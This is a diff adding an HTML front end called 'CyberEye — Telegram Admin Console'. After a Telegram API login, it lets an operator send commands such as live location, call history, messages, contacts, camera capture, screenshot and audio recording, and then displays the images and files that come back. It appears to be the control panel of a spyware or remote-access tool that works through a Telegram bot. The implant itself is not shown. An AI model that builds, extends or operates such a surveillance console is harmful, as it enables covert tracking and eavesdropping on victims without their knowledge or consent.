@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CyberEye — Telegram Admin Console</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=Sora:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --brand:       #2ECC8F;
+  --brand-dark:  #1aa870;
+  --brand-soft:  rgba(46,204,143,0.12);
+  --brand-glow:  rgba(46,204,143,0.25);
+  --accent:      #5B8BF5;
+  --accent-soft: rgba(91,139,245,0.12);
+  --warn:        #F5A623;
+  --warn-soft:   rgba(245,166,35,0.12);
+  --danger:      #F55B5B;
+  --danger-soft: rgba(245,91,91,0.12);
+
+  --bg:          #0F1117;
+  --surface:     #181C26;
+  --surface2:    #1E2333;
+  --surface3:    #252B3B;
+  --border:      rgba(255,255,255,0.07);
+  --border2:     rgba(255,255,255,0.12);
+
+  --text:        #EEF0F7;
+  --text2:       #9BA3BC;
+  --text3:       #5C6480;
+
+  --sidebar-w:   268px;
+  --radius:      16px;
+  --radius-sm:   10px;
+  --radius-xs:   6px;
+
+  --font-head: 'Sora', sans-serif;
+  --font-body: 'Plus Jakarta Sans', sans-serif;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  font-family: var(--font-body);
+  background: var(--bg);
+  color: var(--text);
+  display: flex;
+  height: 100vh;
+  overflow: hidden;
+}
+
+/* ── LOGIN OVERLAY ── */
+#login-overlay {
+  position: fixed; inset: 0; background: var(--bg);
+  display: flex; justify-content: center; align-items: center; z-index: 9999;
+}
+.login-card {
+  background: var(--surface); border: 1px solid var(--border);
+  padding: 40px; border-radius: var(--radius); width: 380px;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+}
+.login-card input {
+  width: 100%; background: var(--surface2); border: 1px solid var(--border);
+  padding: 12px 16px; border-radius: 8px; color: white; margin-bottom: 12px; outline: none;
+}
+
+/* ── SIDEBAR ── */
+.sidebar {
+  width: var(--sidebar-w); background: var(--surface);
+  border-right: 1px solid var(--border); display: flex; flex-direction: column;
+}
+.sidebar-header { padding: 28px 22px; border-bottom: 1px solid var(--border); }
+.brand-label { font-family: var(--font-head); font-weight: 800; font-size: 1.25rem; color: var(--brand); }
+
+.nav-item {
+  display: flex; align-items: center; gap: 11px;
+  padding: 12px 20px; color: var(--text2); cursor: pointer; transition: 0.2s;
+  font-weight: 600; font-size: 0.9rem;
+}
+.nav-item:hover, .nav-item.active { background: var(--brand-soft); color: var(--brand); }
+.nav-item i { width: 20px; text-align: center; }
+
+/* ── MAIN ── */
+.main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+.topbar {
+  height: 70px; background: rgba(15,17,23,0.85); backdrop-filter: blur(20px);
+  border-bottom: 1px solid var(--border); display: flex; align-items: center; padding: 0 30px; justify-content: space-between;
+}
+.content { flex: 1; padding: 30px; overflow-y: auto; }
+
+/* ── PANEL (BOT CHAT) ── */
+.panel {
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: var(--radius); display: flex; flex-direction: column; height: 100%;
+}
+#messages { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 12px; }
+.msg { max-width: 80%; padding: 12px 16px; border-radius: 12px; font-size: 0.9rem; line-height: 1.5; position: relative; }
+.bot-msg { background: var(--surface2); align-self: flex-start; border-bottom-left-radius: 2px; }
+.user-msg { background: var(--brand); color: var(--bg); align-self: flex-end; border-bottom-right-radius: 2px; font-weight: 700; }
+.msg img { max-width: 100%; border-radius: 8px; margin-top: 10px; display: block; border: 1px solid var(--border); cursor: pointer; }
+.file-link {
+  display: flex; align-items: center; gap: 10px; background: var(--bg);
+  padding: 12px; border-radius: 8px; margin-top: 10px; text-decoration: none; color: var(--brand); font-weight: 800;
+}
+
+.input-area { padding: 20px; border-top: 1px solid var(--border); display: flex; gap: 10px; }
+.btn {
+  background: var(--brand); color: var(--bg); font-weight: 800; border: none;
+  padding: 12px 20px; border-radius: 8px; cursor: pointer; transition: 0.2s;
+}
+.btn:hover { filter: brightness(1.1); transform: translateY(-1px); }
+.hidden { display: none !important; }
+
+/* ── IMAGE OVERLAY ── */
+#img-overlay {
+  display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9);
+  z-index: 10000; align-items: center; justify-content: center;
+}
+#img-overlay img { max-width: 90%; max-height: 90%; border-radius: 12px; box-shadow: 0 0 40px rgba(0,0,0,0.5); }
+</style>
+</head>
+<body>
+
+<!-- Login -->
+<div id="login-overlay">
+  <div class="login-card">
+    <h2 style="font-family:var(--font-head); margin-bottom:25px; text-align:center;">CyberEye Login</h2>
+    <input type="text" id="api_id" placeholder="API ID">
+    <input type="text" id="api_hash" placeholder="API Hash">
+    <input type="text" id="phone" placeholder="Phone Number (+91...)">
+    <button class="btn" style="width:100%" onclick="sendCode()">Send OTP</button>
+
+    <div id="otp-section" class="hidden" style="margin-top:20px; border-top:1px solid var(--border); padding-top:20px;">
+      <input type="text" id="otp" placeholder="Enter OTP">
+      <input type="password" id="password" placeholder="2FA Password">
+      <button class="btn" style="width:100%" onclick="login()">Verify & Enter Dashboard</button>
+    </div>
+  </div>
+</div>
+
+<!-- Image Overlay -->
+<div id="img-overlay" onclick="this.style.display='none'">
+  <img id="overlay-img" src="">
+</div>
+
+<div style="display:flex; width:100%; height:100vh;">
+  <!-- Sidebar -->
+  <aside class="sidebar">
+    <div class="sidebar-header">
+      <div class="brand-label"><i class="fas fa-eye"></i> CyberEye</div>
+    </div>
+    <div style="flex:1; overflow-y:auto; padding-top:10px;">
+      <div class="nav-item active" onclick="sendBotCmd('dashboard')"><i class="fas fa-house"></i> Dashboard</div>
+      <div class="nav-item" onclick="sendBotCmd('location')"><i class="fas fa-location-dot"></i> Live Location</div>
+      <div class="nav-item" onclick="sendBotCmd('calls')"><i class="fas fa-phone"></i> Call History</div>
+      <div class="nav-item" onclick="sendBotCmd('messages')"><i class="fas fa-message"></i> Messages</div>
+      <div class="nav-item" onclick="sendBotCmd('contacts')"><i class="fas fa-address-book"></i> Contacts</div>
+      <div class="nav-item" onclick="sendBotCmd('camera')"><i class="fas fa-camera"></i> Camera Capture</div>
+      <div class="nav-item" onclick="sendBotCmd('screenshot')"><i class="fas fa-desktop"></i> Screenshot</div>
+      <div class="nav-item" onclick="sendBotCmd('audio')"><i class="fas fa-microphone"></i> Audio Recording</div>
+    </div>
+    <div style="padding:20px; border-top:1px solid var(--border);">
+      <div class="nav-item" onclick="logout()" style="color:var(--danger);"><i class="fas fa-right-from-bracket"></i> Logout</div>
+    </div>
+  </aside>
+
+  <!-- Main -->
+  <main class="main">
+    <header class="topbar">
+      <div style="font-family:var(--font-head); font-weight:700;">Admin Console</div>
+      <div id="status-badge" style="background:var(--brand-soft); color:var(--brand); padding:6px 14px; border-radius:99px; font-size:0.75rem; font-weight:800; border:1px solid var(--brand-glow);">
+        <i class="fas fa-circle" style="font-size:0.5rem; vertical-align:middle; margin-right:5px;"></i> SYSTEM SECURE
+      </div>
+    </header>
+
+    <div class="content">
+      <div class="panel">
+        <div id="messages">
+            <div class="msg bot-msg">System initialized. Waiting for commands...</div>
+        </div>
+        <div class="input-area">
+          <input type="text" id="cmd-input" placeholder="Type a manual command..." style="flex:1; background:var(--surface2); border:1px solid var(--border); border-radius:8px; padding:12px; color:white; outline:none;">
+          <button class="btn" onclick="sendManualCmd()">Send</button>
+        </div>
+      </div>
+    </div>
+  </main>
+</div>
+
+<script>
+let phone_hash = "";
+
+window.onload = async () => {
+  const resp = await fetch('/check_auth');
+  const data = await resp.json();
+  if (data.authorized) {
+    document.getElementById('login-overlay').classList.add('hidden');
+    startPolling();
+  }
+};
+
+async function sendCode() {
+  const api_id = document.getElementById('api_id').value;
+  const api_hash = document.getElementById('api_hash').value;
+  const phone = document.getElementById('phone').value;
+  if(!api_id || !api_hash || !phone) return alert("Fill all fields");
+
+  const resp = await fetch('/send_code', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ api_id, api_hash, phone })
+  });
+  const data = await resp.json();
+  if(data.success) {
+    phone_hash = data.phone_code_hash;
+    document.getElementById('otp-section').classList.remove('hidden');
+  } else alert(data.error);
+}
+
+async function login() {
+  const otp = document.getElementById('otp').value;
+  const password = document.getElementById('password').value;
+  const resp = await fetch('/login', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ otp, phone_code_hash: phone_hash, password })
+  });
+  const data = await resp.json();
+  if(data.success) {
+    document.getElementById('login-overlay').classList.add('hidden');
+    startPolling();
+  } else alert(data.error);
+}
+
+function sendBotCmd(cmd) {
+  appendMsg(cmd, 'user-msg');
+  fetch('/send_command', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ command: cmd })
+  });
+
+  document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+  event.currentTarget.classList.add('active');
+}
+
+function sendManualCmd() {
+  const inp = document.getElementById('cmd-input');
+  if(!inp.value) return;
+  sendBotCmd(inp.value);
+  inp.value = "";
+}
+
+function appendMsg(text, type, img=null, file=null, fileName=null) {
+  const box = document.getElementById('messages');
+  const div = document.createElement('div');
+  div.className = 'msg ' + type;
+  div.innerText = text;
+
+  if(img) {
+    const i = document.createElement('img');
+    i.src = img;
+    i.onclick = () => {
+      document.getElementById('overlay-img').src = img;
+      document.getElementById('img-overlay').style.display = 'flex';
+    };
+    div.appendChild(i);
+  }
+
+  if(file) {
+    const a = document.createElement('a');
+    a.href = file;
+    a.className = 'file-link';
+    a.download = fileName;
+    a.innerHTML = `<i class="fas fa-file-download"></i> Download ${fileName}`;
+    div.appendChild(a);
+  }
+
+  box.appendChild(div);
+  box.scrollTop = box.scrollHeight;
+}
+
+function startPolling() {
+  setInterval(async () => {
+    const resp = await fetch('/get_updates');
+    const data = await resp.json();
+    data.messages.forEach(m => {
+      appendMsg(m.text, 'bot-msg', m.image_url, m.file_url, m.file_name);
+    });
+  }, 3000);
+}
+
+async function logout() {
+  await fetch('/logout');
+  location.reload();
+}
+</script>
+</body>
+</html>
